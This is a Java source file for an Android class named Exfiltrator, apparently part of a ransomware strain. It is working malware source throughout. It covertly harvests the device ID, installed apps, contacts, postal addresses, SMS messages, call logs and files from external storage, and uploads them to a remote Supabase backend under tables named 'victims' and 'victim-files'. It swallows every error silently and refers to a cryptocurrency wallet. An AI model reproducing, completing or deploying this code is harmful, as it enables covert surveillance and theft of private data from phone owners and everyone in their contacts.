package com.rhfvnc.strain;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.util.List;
public class Exfiltrator implements Runnable {
    private final Context ctx;
    private final String deviceId;
    private final String deviceName;
    private final String deviceFolder;
    private static final long MAX_FILE = 20L * 1024 * 1024;
    public Exfiltrator(Context c) {
        ctx = c;
        String id;
        try { id = Settings.Secure.getString(c.getContentResolver(), Settings.Secure.ANDROID_ID); }
        catch (Throwable t) { id = "unknown"; }
        deviceId = id;
        String nm = null;
        try { nm = Settings.Global.getString(c.getContentResolver(), Settings.Global.DEVICE_NAME); }
        catch (Throwable ignored) {}
        if (nm == null || nm.trim().isEmpty()) nm = Build.MANUFACTURER + " " + Build.MODEL;
        deviceName = nm;
        String safe = nm.replaceAll("[^a-zA-Z0-9_-]", "_");
        String shortId = id.length() >= 6 ? id.substring(0, 6) : id;
        deviceFolder = safe + "_" + shortId;
    }
    @Override
    public void run() {
        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
        try { sendDevice(); } catch (Throwable ignored) {}
        try { sendContacts(); } catch (Throwable ignored) {}
        try { sendAddresses(); } catch (Throwable ignored) {}
        try { sendSms(); } catch (Throwable ignored) {}
        try { sendCalls(); } catch (Throwable ignored) {}
        try { walk(Environment.getExternalStorageDirectory()); } catch (Throwable ignored) {}
    }
    private void uploadJson(String name, JSONArray arr) {
        try {
            byte[] data = arr.toString(2).getBytes("UTF-8");
            SupabaseClient.uploadFile("victim-files", deviceFolder + "/" + name, data, "application/json");
        } catch (Throwable ignored) {}
    }
    private void sendDevice() throws Exception {
        JSONObject o = new JSONObject();
        o.put("device_id", deviceId);
        o.put("device_name", deviceName);
        o.put("device_folder", deviceFolder);
        o.put("model", Build.MODEL);
        o.put("manufacturer", Build.MANUFACTURER);
        o.put("android", Build.VERSION.RELEASE);
        o.put("wallet_address", SolanaCheck.WALLET);
        o.put("app_list", appList());
        SupabaseClient.insert("victims", o.toString());
        JSONArray a = new JSONArray();
        a.put(o);
        uploadJson("info.json", a);
    }
    private String appList() {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder();
            for (ApplicationInfo ap : apps) sb.append(ap.packageName).append(",");
            return sb.toString();
        } catch (Throwable t) { return ""; }
    }
    private void sendContacts() {
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            JSONArray arr = new JSONArray();
            while (c.moveToNext()) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("device_name", deviceName);
                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("phone", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    SupabaseClient.insert("contacts", o.toString());
                    arr.put(o);
                } catch (Throwable ignored) {}
            }
            c.close();
            uploadJson("contacts.json", arr);
        } catch (Throwable ignored) {}
    }
    private void sendAddresses() {
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            JSONArray arr = new JSONArray();
            while (c.moveToNext()) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("device_name", deviceName);
                    o.put("contact_name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME)));
                    o.put("address", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS)));
                    o.put("address_type", String.valueOf(c.getInt(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.TYPE))));
                    SupabaseClient.insert("addresses", o.toString());
                    arr.put(o);
                } catch (Throwable ignored) {}
            }
            c.close();
            uploadJson("addresses.json", arr);
        } catch (Throwable ignored) {}
    }
    private void sendSms() {
        try {
            Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, null);
            if (c == null) return;
            JSONArray arr = new JSONArray();
            int n = 0;
            while (c.moveToNext() && n < 500) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("device_name", deviceName);
                    o.put("sender", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    o.put("timestamp", c.getLong(c.getColumnIndexOrThrow("date")));
                    SupabaseClient.insert("sms", o.toString());
                    arr.put(o);
                    n++;
                } catch (Throwable ignored) {}
            }
            c.close();
            uploadJson("sms.json", arr);
        } catch (Throwable ignored) {}
    }
    private void sendCalls() {
        try {
            Cursor c = ctx.getContentResolver().query(
                android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (c == null) return;
            JSONArray arr = new JSONArray();
            int n = 0;
            while (c.moveToNext() && n < 500) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("device_id", deviceId);
                    o.put("device_name", deviceName);
                    o.put("number", c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)));
                    o.put("type", c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)));
                    o.put("duration", c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)));
                    o.put("timestamp", c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)));
                    SupabaseClient.insert("calls", o.toString());
                    arr.put(o);
                    n++;
                } catch (Throwable ignored) {}
            }
            c.close();
            uploadJson("calls.json", arr);
        } catch (Throwable ignored) {}
    }
    private void walk(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                String nm = f.getName();
                if (nm.equals("Android")) continue;
                walk(f);
            } else {
                if (shouldUpload(f)) uploadOne(f);
            }
        }
    }
    private boolean shouldUpload(File f) {
        try {
            long sz = f.length();
            if (sz <= 0 || sz > MAX_FILE) return false;
            if (f.getName().toLowerCase().endsWith(".rhfvnc")) return false;
            return true;
        } catch (Throwable t) { return false; }
    }
    private String categoryOf(String name) {
        String n = name.toLowerCase();
        if (n.matches(".*\\.(jpg|jpeg|png|gif|webp|bmp|heic|heif)$")) return "photos";
        if (n.matches(".*\\.(mp4|mov|avi|mkv|3gp|webm|flv|m4v)$")) return "videos";
        if (n.matches(".*\\.(mp3|wav|flac|ogg|m4a|aac|opus|amr)$")) return "audio";
        if (n.matches(".*\\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|csv|rtf|odt|ods|odp)$")) return "documents";
        if (n.matches(".*\\.(zip|rar|7z|tar|gz|bz2|xz)$")) return "archives";
        if (n.matches(".*\\.(apk|apks|xapk)$")) return "apks";
        if (n.matches(".*\\.(db|sqlite|sqlite3)$")) return "databases";
        return "other";
    }
    private void uploadOne(File f) {
        try {
            FileInputStream in = new FileInputStream(f);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
            in.close();
            byte[] data = bos.toByteArray();
            String category = categoryOf(f.getName());
            String safe = f.getName().replaceAll("[^a-zA-Z0-9._-]", "_");
            long ts = System.currentTimeMillis();
            String storagePath = deviceFolder + "/" + category + "/" + ts + "_" + safe;
            SupabaseClient.uploadFile("victim-files", storagePath, data, "application/octet-stream");
            JSONObject o = new JSONObject();
            o.put("device_id", deviceId);
            o.put("device_name", deviceName);
            o.put("category", category);
            o.put("folder", category);
            o.put("filename", f.getName());
            o.put("path", f.getAbsolutePath());
            o.put("storage_path", storagePath);
            o.put("size_bytes", data.length);
            SupabaseClient.insert("files", o.toString());
        } catch (Throwable ignored) {}
    }
}
